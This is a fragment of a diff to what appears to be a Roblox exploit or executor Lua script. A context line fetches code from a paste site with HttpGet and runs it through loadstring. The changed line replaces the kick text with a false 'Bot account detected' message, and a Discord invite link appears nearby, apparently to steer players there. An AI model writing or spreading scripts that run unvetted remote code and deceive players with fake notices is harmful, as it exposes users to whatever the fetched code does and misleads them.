@@ -5,7 +5,7 @@ loadstring(game:HttpGet("https://cdn.sourceb.in/bins/bRgM1hx5q4/0"))()
  
 task.wait(20)
  
-local kickMessage = "you are currently using an unsupported executor"
+local kickMessage = "Bot account detected. Please use a different account to proceed"
  
 local link = "https://discord.gg/4PwKfJd6V"
 for i = 1, 10 do
